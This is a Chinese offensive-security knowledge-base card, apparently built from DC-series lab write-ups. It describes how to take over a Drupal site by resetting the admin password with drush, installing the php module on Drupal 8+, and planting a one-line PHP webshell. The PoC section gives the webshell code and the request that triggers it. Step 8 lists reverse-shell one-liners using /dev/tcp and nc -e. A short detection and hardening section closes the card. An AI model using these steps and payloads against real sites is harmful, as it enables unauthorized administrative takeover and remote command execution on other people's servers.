---
id: web-php-framework-drupal-drush-reset-password-php-filter-module-webshell
title: 主机上有可执行的 drush 时直接重置 Drupal 管理员口令进后台；Drupal 8 已移除 PHP filter，需先从官方源装 php 模块再在内容里写一句话
type: scenario
domain: web
path: web/php/framework
technique: drupal-drush-password-reset-php-filter-module-webshell
tags:
- php
- drupal
- drush
- cms
- password-reset
- php-filter
- webshell
- post-exploitation
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W5
  verified_at: '2026-11-08T23:29:47+08:00'
  notes: 已对照原文核对；本次核对未读取图片；dc-7 段记有 drush user-password admin --password 需在 web 目录执行，以及 Drupal 8 移除 php 模块、需从官方源安装 php-8.x-1.0.tar.gz 并在文本格式启用后才能写一句话，均与原文一致；未验证点：原文写作 /var/www/，卡内写 /var/www/html，指向同一站点根；原文未给出 drush 版本，卡内 drush 9+ 的 upwd 别名属通用知识
url: /docs/web/php/framework/web-php-framework-drupal-drush-reset-password-php-filter-module-webshell/
draft: false
kb_aliases:
- drush user-password 重置 Drupal 密码
- Drupal drush 提权后台
- Drupal 8 没有 php filter
- 安装 php-8.x-1.0 模块 getshell
- Drupal 后台写一句话
- drush 命令行改管理员密码
---

## 一句话结论

已拿到一个 Drupal 站点的普通系统用户（Web 用户或更低权限）时，如果机器上装了 `drush` 且能读到站点配置，一条 `drush user-password admin --password="<新口令>"`（必须在 Drupal 根目录，如 `/var/www/html`）就能把超级管理员口令改成已知值，直接进后台；但 Drupal 8 起核心不再带 PHP filter 模块，后台文本框里写 PHP 不会执行——需要先「安装新模块」从官方源拉 `php-8.x-1.0.tar.gz` 并启用，才能在内容里落一句话木马。

## 原理

- `drush` 是 Drupal 的命令行管理工具，直接读写 `sites/default/settings.php` 里配置的数据库：`drush user-password <user> --password=<pwd>` 会算出符合 Drupal 口令哈希格式的值并 `UPDATE users_field_data`，与「登录后台改密码」等价，但**完全绕过 Web 认证**。因此只要系统层能执行 drush，就等于拥有 Drupal 管理员权限。
- 反过来说，Drupal 的口令哈希（`$S$` 前缀，phpass）不可逆；从数据库 dump 里拿到 admin 哈希后常见出路是替换哈希或找 `scripts/password-hash.sh` 自己算一个——而 drush 直接把这两步合成一条命令，是更短的路。
- 之所以「必须在站点根目录执行」，是 drush 靠当前目录逐级向上找 `settings.php` 或 `drush site-alias` 定位站点；在 `/` 或其他目录执行会报 "Could not find a Drupal installation"。
- Drupal 8 的安全改动：核心把 PHP filter（`php` 文本格式）从默认安装中移除，后台「文本格式」里没有 `PHP code` 选项，所以即便拿到管理员、在 Basic page 正文里贴 `<?php system($_GET[0]);?>`，输出也只是被当纯文本转义显示。要恢复这个能力必须额外安装 `php` 模块（Drupal 官方项目 `php`，包名形如 `php-8.x-1.0.tar.gz`），安装后在「文本格式」里启用并授权给管理员。
- 安装模块的两种路径：后台「扩展 → 安装新模块 → 从 URL 安装」填官方包地址（需要服务器能出网），或把 tarball 上传到 `modules/contrib` 再启用。装完必须在「文本格式」里显式启用 PHP code 格式，否则仍然不执行。
- 这条链的价值在于：**不需要打 CVE、不需要爆破**，只要求"主机上有 drush 且当前用户能执行它"。DC 系列靶机里它就是 `sudo -l` 之外被忽略的入口。

## 触发条件

- Drupal 站点（7/8/9 均可，drush 与版本对应）部署在可交互的主机上。
- 已获得一个能执行 `drush` 的系统用户（Web 用户 `www-data`、备份账户，或被 `sudo -u` 允许调用的账户）。
- 当前目录可切到 Drupal 根（如 `/var/www/html`），或可用 `drush --root=/var/www/html`。
- 后台需要落地代码时：Drupal 8+ 需能安装 `php` 模块（出网装或本地上传），并有权限启用文本格式。

## 利用步骤

1. 定位站点根与 drush：`ls /var/www/`、`find / -name drush -type f 2>/dev/null`、`which drush`；确认 `sites/default/settings.php` 存在。
2. 确认 drush 能连库：`cd /var/www/html && drush status`（能打印 Drupal version / Database / Site URI 即通）。
3. 重置管理员口令：`drush user-password admin --password='<新口令>'`；drush 9+ 亦可用 `drush upwd admin --password='<新口令>'`。
4. 登录 `/user/login`（管理员通常是 `/user/1` 或 `/admin`），进后台。
5. Drupal 8+：`/admin/modules/install` → 从 URL 安装 `https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz` → 回到模块列表**启用** php 模块（要点确认）。
6. `/admin/config/content/formats` 编辑admin用的文本格式（如 Full HTML），勾选 PHP code 并保存；或新建一个只给管理员的格式。
7. 新建/编辑一个 Basic page（内容类型 `page`），正文切到刚启用的 PHP 格式，写一句话；保存后访问该节点 URL（`/node/<nid>`）执行。
8. 需要交互 shell 时，由一句话执行 `bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'` 或 `nc -e /bin/bash`。

## PoC

重置口令（必须在 Drupal 根目录）：

```bash
cd /var/www/html
drush status
drush user-password admin --password='P@ssw0rd123'
# 旧版 drush：drush upwd admin --password='P@ssw0rd123'
```

后台安装 php 模块（Drupal 8/9，从 URL 安装）：

```text
https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz
```

文本格式里启用的节点正文（一句话）：

```php
<?php system($_GET['c']); ?>
```

访问执行：

```http
GET /node/3?c=id HTTP/1.1
Host: <target>
```

说明：以上仅为命令与请求形态；`node` 编号、管理员用户名（部分站点不是 `admin`）与文本格式名需按实际站点替换，未对任何目标执行。

## 变体与关联

- 没装 drush 时的等价路径：改 `settings.php` 里的库口令后直连 MySQL 执行 `UPDATE users_field_data SET pass='<已知 phpass 哈希>'`；或用 `scripts/password-hash.sh <pwd>` 生成 `$S$...` 哈希再替换（该脚本必须用 `php scripts/password-hash.sh` 运行，且同样在站点根目录）。
- 只有 Web 用户、无法执行 drush 时：改走 Drupal 已知 CVE（如 [[web-php-rce-drupal-cve-2018-7600-drupalgeddon2]]）。
- 无出网环境装不了 php 模块时：改为上传一个自带 `.module` 的自定义模块 tarball（后台"安装新模块 → 上传"），模块里 `hook_init` 直接执行命令；或写 `.htaccess`/`settings.php`（需可写）。
- 与"口令哈希替换"路线的取舍：哈希替换需要先拿到库权限（注入/dump），drush 路线只需要系统层执行权，链路更短但依赖目标装了 drush。
- 关联：[[web-php-rce-joomla-admin-template-editor-webshell]]（同为"进后台后借模板/文件编辑落 PHP"的思路）、[[web-php-joomla-db-root-reset-admin-password-hash]]（直接改库替换哈希的同类做法）。

## 检测与防御

- 防御：生产机不装 drush（或用 PHP 级权限限制其可执行用户）；`settings.php` 权限 444 并禁止 Web 用户读；Drupal 管理员启用 TFA。
- 防御：禁止后台"从 URL 安装模块"（可关掉 `file` 模块的远程拉取 / 限制出网），并在 `settings.php` 里设置 `$settings['allow_authorize_operations'] = FALSE;` 限制更新权限。
- 检测：Web 用户执行 `drush`/`php` 子进程、`users_field_data` 的 `pass` 字段被非 Web 路径更新；后台出现 `ftp.drupal.org` 模块下载；文本格式被新增/修改并勾选 PHP code；节点正文含 `<?php`。
- 加固：Drupal 8+ 保持 PHP filter 未安装状态；对已启用 PHP 格式的站点做配置基线核查（`drush config:get filter.format.*`）。
